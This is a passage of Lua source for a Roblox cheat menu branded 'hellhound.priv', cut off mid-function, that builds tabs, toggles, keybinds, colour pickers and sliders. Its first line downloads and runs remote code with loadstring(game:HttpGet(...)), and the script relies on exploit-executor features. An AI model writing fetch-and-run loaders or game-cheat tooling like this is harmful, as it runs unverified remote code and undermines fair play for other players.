local notificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/ui-libraries/main/xaxas-notification/src.lua"))();
local notifications = notificationLibrary.new({            
    NotificationLifetime = 3, 
    NotificationPosition = "Middle",
    
    TextFont = Enum.Font.Code,
    TextColor = Color3.fromRGB(255, 255, 255),
    TextSize = 15,
    
    TextStrokeTransparency = 0, 
    TextStrokeColor = Color3.fromRGB(0, 0, 0)
});

notifications:BuildNotificationUI();
notifications:Notify("...");

wait(2.5)

notifications:Notify("Loading...");

wait(1)

local inputService   = game:GetService("UserInputService")
local runService     = game:GetService("RunService")
local tweenService   = game:GetService("TweenService")
local players        = game:GetService("Players")
local localPlayer    = players.LocalPlayer
local mouse          = localPlayer:GetMouse()

local menu           = game:GetObjects("rbxassetid://12702460854")[1]
menu.bg.Position     = UDim2.new(0.5,-menu.bg.Size.X.Offset/2,0.5,-menu.bg.Size.Y.Offset/2)
menu.Parent          = game:GetService("CoreGui")
menu.bg.pre.Text = 'hellhound<font color="#c375ae">.private</font>'



local library = {cheatname = "hellhound.priv";ext = "";gamename = "";colorpicking = false;tabbuttons = {};tabs = {};options = {};flags = {};scrolling = false;notifyText = Drawing.new("Text");playing = false;multiZindex = 200;toInvis = {};libColor = Color3.fromRGB(240, 142, 214);disabledcolor = Color3.fromRGB(233, 0, 0);blacklisted = {Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.UserInputType.MouseMovement}}

function draggable(a)local b=inputService;local c;local d;local e;local f;local function g(h)if not library.colorpicking then local i=h.Position-e;a.Position=UDim2.new(f.X.Scale,f.X.Offset+i.X,f.Y.Scale,f.Y.Offset+i.Y)end end;a.InputBegan:Connect(function(h)if h.UserInputType==Enum.UserInputType.MouseButton1 or h.UserInputType==Enum.UserInputType.Touch then c=true;e=h.Position;f=a.Position;h.Changed:Connect(function()if h.UserInputState==Enum.UserInputState.End then c=false end end)end end)a.InputChanged:Connect(function(h)if h.UserInputType==Enum.UserInputType.MouseMovement or h.UserInputType==Enum.UserInputType.Touch then d=h end end)b.InputChanged:Connect(function(h)if h==d and c then g(h)end end)end
draggable(menu.bg)

local tabholder = menu.bg.bg.bg.bg.main.group
local tabviewer = menu.bg.bg.bg.bg.tabbuttons



inputService.InputEnded:Connect(function(key)
    if key.KeyCode == Enum.KeyCode.RightShift then
        menu.Enabled = not menu.Enabled
        library.scrolling = false
        library.colorpicking = false
        for i,v in next, library.toInvis do
            v.Visible = false
        end
    end
end)

local keyNames = {
    [Enum.KeyCode.LeftAlt] = 'LALT';
    [Enum.KeyCode.RightAlt] = 'RALT';
    [Enum.KeyCode.LeftControl] = 'LCTRL';
    [Enum.KeyCode.RightControl] = 'RCTRL';
    [Enum.KeyCode.LeftShift] = 'LSHIFT';
    [Enum.KeyCode.RightShift] = 'RSHIFT';
    [Enum.KeyCode.Underscore] = '_';
    [Enum.KeyCode.Minus] = '-';
    [Enum.KeyCode.Plus] = '+';
    [Enum.KeyCode.Period] = '.';
    [Enum.KeyCode.Slash] = '/';
    [Enum.KeyCode.BackSlash] = '\\';
    [Enum.KeyCode.Question] = '?';
    [Enum.UserInputType.MouseButton1] = 'MB1';
    [Enum.UserInputType.MouseButton2] = 'MB2';
    [Enum.UserInputType.MouseButton3] = 'MB3';
}

library.notifyText.Font = 2
library.notifyText.Size = 13
library.notifyText.Outline = true
library.notifyText.Color = Color3.new(1,1,1)
library.notifyText.Position = Vector2.new(10,60)

function library:Tween(...)
    tweenService:Create(...):Play()
end

function library:notify(text)
    if playing then return end
    playing = true
    library.notifyText.Text = text
    library.notifyText.Transparency = 0
    library.notifyText.Visible = true
    for i = 0,1,0.1 do wait()
        library.notifyText.Transparency = i
    end
    spawn(function()
        wait(3)
        for i = 1,0,-0.1 do wait()
            library.notifyText.Transparency = i
        end
        playing = false
        library.notifyText.Visible = false
    end)
end

function library:addTab(name)
    local newTab = tabholder.tab:Clone()
    local newButton = tabviewer.button:Clone()

    table.insert(library.tabs,newTab)
    newTab.Parent = tabholder
    newTab.Visible = false

    table.insert(library.tabbuttons,newButton)
    newButton.Parent = tabviewer
    newButton.Modal = true
    newButton.Visible = true
    newButton.text.Text = name
    newButton.MouseButton1Click:Connect(function()
        for i,v in next, library.tabs do
            v.Visible = v == newTab
        end
        for i,v in next, library.toInvis do
            v.Visible = false
        end
        for i,v in next, library.tabbuttons do
            local state = v == newButton
            if state then
                v.element.Visible = true
                library:Tween(v.element, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})
                v.text.TextColor3 = Color3.fromRGB(244, 244, 244)
            else
                library:Tween(v.element, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})
                v.text.TextColor3 = Color3.fromRGB(144, 144, 144)
            end
        end
    end)

    local tab = {}
    local groupCount = 0
    local jigCount = 0
    local topStuff = 2000
    function tab:createGroup(pos,groupname) -- newTab[pos == 0 and "left" or "right"] 
        local groupbox = Instance.new("Frame")
        local grouper = Instance.new("Frame")
        local UIListLayout = Instance.new("UIListLayout")
        local UIPadding = Instance.new("UIPadding")
        local element = Instance.new("Frame")
        local title = Instance.new("TextLabel")
        local backframe = Instance.new("Frame")

        groupCount -= 1

        groupbox.Parent = newTab[pos]
        groupbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        groupbox.BorderColor3 = Color3.fromRGB(30, 30, 30)
        groupbox.BorderSizePixel = 2
        groupbox.Size = UDim2.new(0, 211, 0, 8)
        groupbox.ZIndex = groupCount

        grouper.Parent = groupbox
        grouper.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        grouper.BorderColor3 = Color3.fromRGB(0, 0, 0)
        grouper.Size = UDim2.new(1, 0, 1, 0)

        UIListLayout.Parent = grouper
        UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

        UIPadding.Parent = grouper
        UIPadding.PaddingBottom = UDim.new(0, 4)
        UIPadding.PaddingTop = UDim.new(0, 7)

        element.Name = "element"
        element.Parent = groupbox
        element.BackgroundColor3 = library.libColor
        element.BorderSizePixel = 0
        element.Size = UDim2.new(1, 0, 0, 1)

        title.Parent = groupbox
        title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        title.BackgroundTransparency = 1.000
        title.BorderSizePixel = 0
        title.Position = UDim2.new(0, 17, 0, 0)
        title.ZIndex = 2
        title.Font = Enum.Font.Code
        title.Text = groupname or ""
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.TextSize = 13.000
        title.TextStrokeTransparency = 0.000
        title.TextXAlignment = Enum.TextXAlignment.Left

        backframe.Parent = groupbox
        backframe.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        backframe.BorderSizePixel = 0
        backframe.Position = UDim2.new(0, 10, 0, -2)
        backframe.Size = UDim2.new(0, 13 + title.TextBounds.X, 0, 3)

        local group = {}
        function group:addToggle(args)
            if not args.flag and args.text then args.flag = args.text end
            if not args.flag then return warn("⚠️ incorrect arguments ⚠️ - missing args on recent toggle") end
            groupbox.Size += UDim2.new(0, 0, 0, 20)

            local toggleframe = Instance.new("Frame")
            local tobble = Instance.new("Frame")
            local mid = Instance.new("Frame")
            local front = Instance.new("Frame")
            local text = Instance.new("TextLabel")
            local button = Instance.new("TextButton")

            jigCount -= 1
            library.multiZindex -= 1

            toggleframe.Name = "toggleframe"
            toggleframe.Parent = grouper
            toggleframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            toggleframe.BackgroundTransparency = 1.000
            toggleframe.BorderSizePixel = 0
            toggleframe.Size = UDim2.new(1, 0, 0, 20)
            toggleframe.ZIndex = library.multiZindex
            
            tobble.Name = "tobble"
            tobble.Parent = toggleframe
            tobble.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            tobble.BorderColor3 = Color3.fromRGB(0, 0, 0)
            tobble.BorderSizePixel = 3
                        tobble.Position = UDim2.new(0.0299999993, 0, 0.272000015, 0)

            tobble.Size = UDim2.new(0, 10, 0, 10)
            
            mid.Name = "mid"
            mid.Parent = tobble
            mid.BackgroundColor3 = Color3.fromRGB(69, 23, 255)
            mid.BorderColor3 = Color3.fromRGB(30,30,30)
            mid.BorderSizePixel = 2
            mid.Size = UDim2.new(0, 10, 0, 10)
            
            front.Name = "front"
            front.Parent = mid
            front.BackgroundColor3 = Color3.fromRGB(15,15,15)
            front.BorderColor3 = Color3.fromRGB(0, 0, 0)
            front.Size = UDim2.new(0, 10, 0, 10)
            
            text.Name = "text"
            text.Parent = toggleframe
            text.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0, 22, 0, 0)
            text.Size = UDim2.new(0, 0, 1, 2)
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(155, 155, 155)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left
            
            button.Name = "button"
            button.Parent = toggleframe
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

            button.BackgroundTransparency = 1.000
            button.BorderSizePixel = 0
            button.Size = UDim2.new(0, 101, 1, 0)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000

            if args.disabled then
                button.Visible = false
                text.TextColor3 = library.disabledcolor
                text.Text = args.text
            return end

            local state = false
            function toggle(newState)
                state = newState
                library.flags[args.flag] = state
                front.BackgroundColor3 = state and library.libColor or Color3.fromRGB(15,15,15)
                text.TextColor3 = state and Color3.fromRGB(244, 244, 244) or Color3.fromRGB(144, 144, 144)
                if args.callback then
                    args.callback(state)
                end
            end
            button.MouseButton1Click:Connect(function()
                state = not state
                front.Name = state and "accent" or "back"
                library.flags[args.flag] = state
                mid.BorderColor3 = Color3.fromRGB(30,30,30)
                front.BackgroundColor3 = state and library.libColor or Color3.fromRGB(15,15,15)
                text.TextColor3 = state and Color3.fromRGB(244, 244, 244) or Color3.fromRGB(144, 144, 144)
                if args.callback then
                    args.callback(state)
                end
            end)
            button.MouseEnter:connect(function()
                mid.BorderColor3 = library.libColor
			end)
            button.MouseLeave:connect(function()
                mid.BorderColor3 = Color3.fromRGB(30,30,30)
			end)

            library.flags[args.flag] = false
            library.options[args.flag] = {type = "toggle",changeState = toggle,skipflag = args.skipflag,oldargs = args}
            local toggle = {}
            function toggle:addKeybind(args)
                if not args.flag then return warn("⚠️ incorrect arguments ⚠️ - missing args on toggle:keybind") end
                local next = false
                
                local keybind = Instance.new("Frame")
                local button = Instance.new("TextButton")
            
                keybind.Parent = toggleframe
                keybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                keybind.BackgroundTransparency = 1.000
                keybind.BorderColor3 = Color3.fromRGB(0, 0, 0)
                keybind.BorderSizePixel = 0
                keybind.Position = UDim2.new(1, -50, 0, 0) -- Positioned to the right end of the toggle frame
                keybind.Size = UDim2.new(0, 50, 0, 20) -- Adjusted size for better visibility
            
                button.Parent = keybind
                button.BackgroundColor3 = Color3.fromRGB(187, 131, 255)
                button.BackgroundTransparency = 1.000
                button.BorderSizePixel = 0
                button.Position = UDim2.new(0, 0, 0, 0) -- Positioned within the keybind frame
                button.Size = UDim2.new(1, 0, 1, 0)
                button.Font = Enum.Font.Code
                button.Text = ""
                button.TextColor3 = Color3.fromRGB(155, 155, 155)
                button.TextSize = 13.000
                button.TextStrokeTransparency = 0.000
                button.TextXAlignment = Enum.TextXAlignment.Right
            
                function updateValue(val)
                    if library.colorpicking then return end
                    library.flags[args.flag] = val
                    button.Text = keyNames[val] or val.Name
                end
            
                inputService.InputBegan:Connect(function(key)
                    local key = key.KeyCode == Enum.KeyCode.Unknown and key.UserInputType or key.KeyCode
                    if next then
                        if not table.find(library.blacklisted, key) then
                            next = false
                            library.flags[args.flag] = key
                            button.Text = keyNames[key] or key.Name
                            button.TextColor3 = Color3.fromRGB(155, 155, 155)
                        end
                    end
                    if not next and key == library.flags[args.flag] and args.callback then
                        args.callback()
                    end
                end)
            
                button.MouseButton1Click:Connect(function()
                    if library.colorpicking then return end
                    library.flags[args.flag] = Enum.KeyCode.Unknown
                    button.Text = "--"
                    button.TextColor3 = library.libColor
                    next = true
                end)
            
                library.flags[args.flag] = Enum.KeyCode.Unknown
                library.options[args.flag] = {type = "keybind", changeState = updateValue, skipflag = args.skipflag, oldargs = args}
            
                updateValue(args.key or Enum.KeyCode.Unknown)
            end            
            function toggle:addColorpicker(args)
                if not args.flag and args.text then args.flag = args.text end
                if not args.flag then return warn("⚠️ incorrect arguments ⚠️") end
                local colorpicker = Instance.new("Frame")
                local mid = Instance.new("Frame")
                local front = Instance.new("Frame")
                local button2 = Instance.new("TextButton")
                local colorFrame = Instance.new("Frame")
                local colorFrame_2 = Instance.new("Frame")
                local hueframe = Instance.new("Frame")
                local main = Instance.new("Frame")
                local hue = Instance.new("ImageLabel")
                local pickerframe = Instance.new("Frame")
                local main_2 = Instance.new("Frame")
                local picker = Instance.new("ImageLabel")
                local clr = Instance.new("Frame")
                local copy = Instance.new("TextButton")

                library.multiZindex -= 1
                jigCount -= 1
                topStuff -= 1 --args.second

                colorpicker.Parent = toggleframe
                colorpicker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                colorpicker.BorderColor3 = Color3.fromRGB(0, 0, 0)
                colorpicker.BorderSizePixel = 3
                colorpicker.Position = args.second and UDim2.new(0.720000029, 4, 0.272000015, 0) or UDim2.new(0.860000014, 4, 0.272000015, 0)
                colorpicker.Size = UDim2.new(0, 20, 0, 10)
                
                mid.Name = "mid"
                mid.Parent = colorpicker
                mid.BackgroundColor3 = Color3.fromRGB(69, 23, 255)
                mid.BorderColor3 = Color3.fromRGB(30,30,30)
                mid.BorderSizePixel = 2
                mid.Size = UDim2.new(1, 0, 1, 0)
                
                front.Name = "front"
                front.Parent = mid
                front.BackgroundColor3 = Color3.fromRGB(240, 142, 214)
                front.BorderColor3 = Color3.fromRGB(0, 0, 0)
                front.Size = UDim2.new(1, 0, 1, 0)
                
                button2.Name = "button2"
                button2.Parent = front
                button2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                button2.BackgroundTransparency = 1.000
                button2.Size = UDim2.new(1, 0, 1, 0)
                button2.Text = ""
                button2.Font = Enum.Font.SourceSans
                button2.TextColor3 = Color3.fromRGB(0, 0, 0)
                button2.TextSize = 14.000

				colorFrame.Name = "colorFrame"
				colorFrame.Parent = toggleframe
				colorFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				colorFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
				colorFrame.BorderSizePixel = 2
				colorFrame.Position = UDim2.new(0.101092957, 0, 0.75, 0)
				colorFrame.Size = UDim2.new(0, 137, 0, 128)

				colorFrame_2.Name = "colorFrame"
				colorFrame_2.Parent = colorFrame
				colorFrame_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
				colorFrame_2.BorderColor3 = Color3.fromRGB(60, 60, 60)
				colorFrame_2.Size = UDim2.new(1, 0, 1, 0)

				hueframe.Name = "hueframe"
				hueframe.Parent = colorFrame_2
				hueframe.Parent = colorFrame_2
                hueframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
                hueframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
                hueframe.BorderSizePixel = 2
                hueframe.Position = UDim2.new(-0.0930000022, 18, -0.0599999987, 30)
                hueframe.Size = UDim2.new(0, 100, 0, 100)
    
                main.Name = "main"
                main.Parent = hueframe
                main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                main.BorderColor3 = Color3.fromRGB(0, 0, 0)
                main.Size = UDim2.new(0, 100, 0, 100)
                main.ZIndex = 6
    
                picker.Name = "picker"
                picker.Parent = main
                picker.BackgroundColor3 = Color3.fromRGB(232, 0, 255)
                picker.BorderColor3 = Color3.fromRGB(0, 0, 0)
                picker.BorderSizePixel = 0
                picker.Size = UDim2.new(0, 100, 0, 100)
                picker.ZIndex = 104
                picker.Image = "rbxassetid://2615689005"
    
                pickerframe.Name = "pickerframe"
                pickerframe.Parent = colorFrame
                pickerframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
                pickerframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
                pickerframe.BorderSizePixel = 2
                pickerframe.Position = UDim2.new(0.711000025, 14, -0.0599999987, 30)
                pickerframe.Size = UDim2.new(0, 20, 0, 100)
    
                main_2.Name = "main"
                main_2.Parent = pickerframe
                main_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                main_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                main_2.Size = UDim2.new(0, 20, 0, 100)
                main_2.ZIndex = 6
    
                hue.Name = "hue"
                hue.Parent = main_2
                hue.BackgroundColor3 = Color3.fromRGB(255, 0, 178)
                hue.BorderColor3 = Color3.fromRGB(0, 0, 0)
                hue.BorderSizePixel = 0
                hue.Size = UDim2.new(0, 20, 0, 100)
                hue.ZIndex = 104
                hue.Image = "rbxassetid://2615692420"
    
                clr.Name = "clr"
                clr.Parent = colorFrame
                clr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                clr.BackgroundTransparency = 1.000
                clr.BorderColor3 = Color3.fromRGB(60, 60, 60)
                clr.BorderSizePixel = 2
                clr.Position = UDim2.new(0.0280000009, 0, 0, 2)
                clr.Size = UDim2.new(0, 129, 0, 14)
                clr.ZIndex = 5
    
                copy.Name = "copy"
                copy.Parent = clr
                copy.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                copy.BackgroundTransparency = 1.000
                copy.BorderSizePixel = 0
                copy.Size = UDim2.new(0, 129, 0, 14)
                copy.ZIndex = 5
                copy.Font = Enum.Font.SourceSans
                copy.Text = args.text or args.flag
                copy.TextColor3 = Color3.fromRGB(100, 100, 100)
                copy.TextSize = 14.000
                copy.TextStrokeTransparency = 0.000

                copy.MouseButton1Click:Connect(function() -- "  "..args.text or "  "..args.flag
                    colorFrame.Visible = false
                end)

                button2.MouseButton1Click:Connect(function()
                    colorFrame.Visible = not colorFrame.Visible
                    mid.BorderColor3 = Color3.fromRGB(30,30,30)
                end)

                button2.MouseEnter:connect(function()
                    mid.BorderColor3 = library.libColor
                end)
                button2.MouseLeave:connect(function()
                    mid.BorderColor3 = Color3.fromRGB(30,30,30)
                end)

                local function updateValue(value,fakevalue)
                    if typeof(value) == "table" then value = fakevalue end
                    library.flags[args.flag] = value
                    front.BackgroundColor3 = value
                    if args.callback then
                        args.callback(value)
                    end
                end

                local white, black = Color3.new(1,1,1), Color3.new(0,0,0)
                local colors = {Color3.new(1,0,0),Color3.new(1,1,0),Color3.new(0,1,0),Color3.new(0,1,1),Color3.new(0,0,1),Color3.new(1,0,1),Color3.new(1,0,0)}
                local heartbeat = game:GetService("RunService").Heartbeat

                local pickerX,pickerY,hueY = 0,0,0
                local oldpercentX,oldpercentY = 0,0

                hue.MouseEnter:Connect(function()
                    local input = hue.InputBegan:connect(function(key)
                        if key.UserInputType == Enum.UserInputType.MouseButton1 then
                            while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                                library.colorpicking = true
                                local percent = (hueY-hue.AbsolutePosition.Y-36)/hue.AbsoluteSize.Y
                                local num = math.max(1, math.min(7,math.floor(((percent*7+0.5)*100))/100))
                                local startC = colors[math.floor(num)]
                                local endC = colors[math.ceil(num)]
                                local color = white:lerp(picker.BackgroundColor3, oldpercentX):lerp(black, oldpercentY)
                                picker.BackgroundColor3 = startC:lerp(endC, num-math.floor(num)) or Color3.new(0, 0, 0)
                                updateValue(color)
                            end
                            library.colorpicking = false
                        end
                    end)
                    local leave
                    leave = hue.MouseLeave:connect(function()
                        input:disconnect()
                        leave:disconnect()
                    end)
                end)

                picker.MouseEnter:Connect(function()
                    local input = picker.InputBegan:connect(function(key)
                        if key.UserInputType == Enum.UserInputType.MouseButton1 then
                            while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                                library.colorpicking = true
                                local xPercent = (pickerX-picker.AbsolutePosition.X)/picker.AbsoluteSize.X
                                local yPercent = (pickerY-picker.AbsolutePosition.Y-36)/picker.AbsoluteSize.Y
                                local color = white:lerp(picker.BackgroundColor3, xPercent):lerp(black, yPercent)
                                updateValue(color)
                                oldpercentX,oldpercentY = xPercent,yPercent
                            end
                            library.colorpicking = false
                        end
                    end)
                    local leave
                    leave = picker.MouseLeave:connect(function()
                        input:disconnect()
                        leave:disconnect()
                    end)
                end)

                hue.MouseMoved:connect(function(_, y)
                    hueY = y
                end)

                picker.MouseMoved:connect(function(x, y)
                    pickerX,pickerY = x,y
                end)

                table.insert(library.toInvis,colorFrame)
                library.flags[args.flag] = Color3.new(1,1,1)
                library.options[args.flag] = {type = "colorpicker",changeState = updateValue,skipflag = args.skipflag,oldargs = args}

                updateValue(args.color or Color3.new(1,1,1))
            end
            return toggle
        end
        function group:addButton(args)
            if not args.callback or not args.text then return warn("⚠️ incorrect arguments ⚠️") end
            groupbox.Size += UDim2.new(0, 0, 0, 22)

            local buttonframe = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("Frame")
            local button = Instance.new("TextButton")
            local gradient = Instance.new("UIGradient")

            buttonframe.Name = "buttonframe"
            buttonframe.Parent = grouper
            buttonframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            buttonframe.BackgroundTransparency = 1.000
            buttonframe.BorderSizePixel = 0
            buttonframe.Size = UDim2.new(1, 0, 0, 21)
            
            bg.Name = "bg"
            bg.Parent = buttonframe
            bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.02, -1, 0, 0)
            bg.Size = UDim2.new(0, 205, 0, 15)
            
            main.Name = "main"
            main.Parent = bg
            main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            main.BorderColor3 = Color3.fromRGB(60, 60, 60)
            main.Size = UDim2.new(1, 0, 1, 0)
            
            button.Name = "button"
            button.Parent = main
            button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            button.BackgroundTransparency = 1.000
            button.BorderSizePixel = 0
            button.Size = UDim2.new(1, 0, 1, 0)
            button.Font = Enum.Font.Code
            button.Text = args.text or args.flag
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.TextSize = 13.000
            button.TextStrokeTransparency = 0.000
            
            gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(105, 105, 105)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(121, 121, 121))}
            gradient.Rotation = 90
            gradient.Name = "gradient"
            gradient.Parent = main

            button.MouseButton1Click:Connect(function()
                if not library.colorpicking then
                    args.callback()
                end
            end)
            button.MouseEnter:connect(function()
                main.BorderColor3 = library.libColor
			end)
			button.MouseLeave:connect(function()
                main.BorderColor3 = Color3.fromRGB(60, 60, 60)
			end)
        end
        function group:addSlider(args, sub)
            if not args.flag or not args.max or not args.increment then
                return warn("⚠️ incorrect arguments ⚠️")
            end
            groupbox.Size += UDim2.new(0, 0, 0, 30)
        
            local slider = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("Frame")
            local fill = Instance.new("Frame")
            local button = Instance.new("TextButton")
            local valuetext = Instance.new("TextLabel")
            local UIGradient = Instance.new("UIGradient")
            local text = Instance.new("TextLabel")
        
            slider.Name = "slider"
            slider.Parent = grouper
            slider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            slider.BackgroundTransparency = 1.000
            slider.BorderSizePixel = 0
            slider.Size = UDim2.new(1, 0, 0, 30)
        
            bg.Name = "bg"
            bg.Parent = slider
            bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.02, -1, 0, 16)
            bg.Size = UDim2.new(0, 205, 0, 10)
        
            main.Name = "main"
            main.Parent = bg
            main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            main.BorderColor3 = Color3.fromRGB(50, 50, 50)
            main.Size = UDim2.new(1, 0, 1, 0)
        
            fill.Name = "fill"
            fill.Parent = main
            fill.BackgroundColor3 = library.libColor
            fill.BackgroundTransparency = 0.200
            fill.BorderColor3 = Color3.fromRGB(60, 60, 60)
            fill.BorderSizePixel = 0
            fill.Size = UDim2.new(0, 0, 1, 0)
        
            button.Name = "button"
            button.Parent = main
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.BackgroundTransparency = 1.000
            button.Size = UDim2.new(0, 191, 1, 0)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000
        
            valuetext.Parent = main
            valuetext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            valuetext.BackgroundTransparency = 1.000
            valuetext.Position = UDim2.new(0.5, 0, 0.5, 0)
            valuetext.Font = Enum.Font.Code
            valuetext.Text = tostring(args.min)
            valuetext.TextColor3 = Color3.fromRGB(255, 255, 255)
            valuetext.TextSize = 14.000
            valuetext.TextStrokeTransparency = 0.000
        
            UIGradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(105, 105, 105)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(121, 121, 121))
            }
            UIGradient.Rotation = 90
            UIGradient.Parent = main
        
            text.Name = "text"
            text.Parent = slider
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.0299999993, -1, 0, 7)
            text.ZIndex = 2
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left
        
            local entered = false
            local scrolling = false
        
            local function updateValue(value)
                if library.colorpicking then return end
                if value < args.min then value = args.min end
                if value > args.max then value = args.max end
        
                local fillSize = UDim2.new((value - args.min) / (args.max - args.min), 0, 1, 0)
                fill:TweenSize(fillSize, Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 0.3, true)
        
                local suffix = sub or ""
                valuetext.Text = string.format("%.2f", value) .. suffix
                library.flags[args.flag] = value
        
                if args.callback then
                    args.callback(value)
                end
            end
        
            local function updateScroll()
                if scrolling or library.scrolling or not slider.Parent.Visible or library.colorpicking then
                    return
                end
        
                while inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and slider.Parent.Visible do
                    runService.RenderStepped:Wait()
        
                    library.scrolling = true
                    scrolling = true
        
                    local mousePos = inputService:GetMouseLocation()
                    local relativeX = mousePos.X - button.AbsolutePosition.X
                    local value = args.min + (relativeX / button.AbsoluteSize.X) * (args.max - args.min)
                    value = math.floor(value / args.increment + 0.5) * args.increment  -- Apply increment
        
                    updateValue(value)
                end
        
                scrolling = false
                library.scrolling = false
            end
        
            button.MouseEnter:Connect(function()
                if library.colorpicking then return end
                if scrolling or entered then return end
        
                entered = true
                main.BorderColor3 = library.libColor
        
                while entered do
                    wait()
                    updateScroll()
                end
            end)
        
            button.MouseLeave:Connect(function()
                entered = false
                main.BorderColor3 = Color3.fromRGB(60, 60, 60)
            end)
        
            if args.value then
                updateValue(args.value)
            end
        
            library.flags[args.flag] = args.value or args.min
            library.options[args.flag] = {
                type = "slider",
                changeState = updateValue,
                skipflag = args.skipflag,
                oldargs = args
            }
        end        
        function group:addTextbox(args)
            if not args.flag then return warn("⚠️ incorrect arguments ⚠️") end
            groupbox.Size += UDim2.new(0, 0, 0, 35)

            local textbox = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("ScrollingFrame")
            local box = Instance.new("TextBox")
            local gradient = Instance.new("UIGradient")
            local text = Instance.new("TextLabel")

            box:GetPropertyChangedSignal('Text'):Connect(function(val)
                if library.colorpicking then return end
                library.flags[args.flag] = box.Text
                args.value = box.Text
                if args.callback then
                    args.callback()
                end
            end)
            textbox.Name = "textbox"
            textbox.Parent = grouper
            textbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            textbox.BackgroundTransparency = 1.000
            textbox.BorderSizePixel = 0
            textbox.Size = UDim2.new(1, 0, 0, 35)
            textbox.ZIndex = 10

            bg.Name = "bg"
            bg.Parent = textbox
            bg.BackgroundColor3 = Color3.fromRGB(15,15,15)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.02, -1, 0, 16)
            bg.Size = UDim2.new(0, 205, 0, 15)

            main.Name = "main"
            main.Parent = bg
            main.Active = true
            main.BackgroundColor3 = Color3.fromRGB(15,15,15)
            main.BorderColor3 = Color3.fromRGB(30, 30, 30)
            main.Size = UDim2.new(1, 0, 1, 0)
            main.CanvasSize = UDim2.new(0, 0, 0, 0)
            main.ScrollBarThickness = 0

            box.Name = "box"
            box.Parent = main
            box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            box.BackgroundTransparency = 1.000
            box.Selectable = false
            box.Size = UDim2.new(1, 0, 1, 0)
            box.Font = Enum.Font.Code
            box.Text = args.value or ""
            box.TextColor3 = Color3.fromRGB(255, 255, 255)
            box.TextSize = 13.000
            box.TextStrokeTransparency = 0.000
            box.TextXAlignment = Enum.TextXAlignment.Left

